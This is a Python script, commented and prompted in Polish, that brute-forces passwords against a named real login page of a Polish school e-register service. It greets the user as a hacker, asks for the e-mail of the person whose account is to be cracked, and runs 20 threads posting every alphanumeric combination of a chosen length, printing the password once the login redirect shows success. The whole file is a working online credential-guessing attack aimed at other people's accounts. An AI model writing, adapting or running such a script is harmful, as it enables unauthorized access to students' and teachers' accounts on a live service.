from random import random, randint
import requests
import threading
import time

znaki = []

for i in range(65, 91):
    znaki.append(chr(i))

for i in range(97, 123):
    znaki.append(chr(i))

for i in range(0, 10):
    znaki.append(str(i))

def generateEnd(before, left):
    if left == 1:

        for i in range(0, len(znaki)):
            sendRequest(before + znaki[i])

    else:

        for i in range(0, len(znaki)):
            generateEnd(before + znaki[i], left - 1)


print("Witaj Hakerze")
print("Jezeli chcesz testowac wpisz slowo TEST")
print("Podaj e-mail osoby ktora chcesz rozgryzc: ")
email = input("> ")

if email == "TEST":

    debug = True

    print("WERSJA DO TESTOWANIA")

    print("Podaj SWOJ adres e-mail:")

    email = input("Email: ")

    print("Podaj poczatek swojego hasla ( nie cale ), po czym ile znakow brakuje na koncu.")

    poczatek = input("Poczatek hasla: ")

    print("Ile znakow brakuje na koncu?")

    brakujace = int(input("Brakujace: "))

else:

    print("Cudownie, ilu znakowe hasla nalezy testowac?")

    dlugosc = int(input("> "))

print("Wszystko gotowe. Kliknij aby zaczac :)")

input()

print("Started")

data = {
    "LoginName": email
}

url = "https://cufs.vulcan.net.pl/kielce/Account/LogOn?ReturnUrl=%2Fkielce%2FFS%2FLS%3Fwa%3Dwsignin1.0%26wtrealm" \
      "%3Dhttps%253a%252f%252fuonetplus.vulcan.net.pl%252fkielce%252fLoginEndpoint.aspx%26wctx%3Dhttps%253a%252f" \
      "%252fuonetplus.vulcan.net.pl%252fkielce%252fLoginEndpoint.aspx "

running = True
lastWork = -1
count = time.time()
amount = 0

threads = []


def sendRequest(password):
    global count, last, data, url, amount, running

    dict = data.copy()
    dict["Password"] = password

    amount += 1

    if time.time() - count > 1:
        count = time.time()

        print("Hasla/sec: " + str(amount) + ". Last " + password)

        amount = 0

    request = requests.post(url=url, data=dict)

    if request.url[35] == 'S':

        for i in range(0, 100):

            print("Wygralo "+password)


        running = False



watki = 20

if debug:

    print("Wersja do testowania. Wlaczone jedynie na jednym watku!")

    watki = 1


def startThread():
    global lastWork, running, dlugosc, debug, poczatek, brakujace

    while running:
        lastWork += 1

        if debug:

            print("Wystartowano tester")

            generateEnd(poczatek, brakujace)

        else:

            print("Starting thread with id " + str(lastWork))

            generateEnd(znaki[lastWork], dlugosc-1)


for i in range(watki):
    t = threading.Thread(target=startThread)
    t.daemon = True
    threads.append(t)

for i in range(watki):
    threads[i].start()

for i in range(watki):
    threads[i].join()
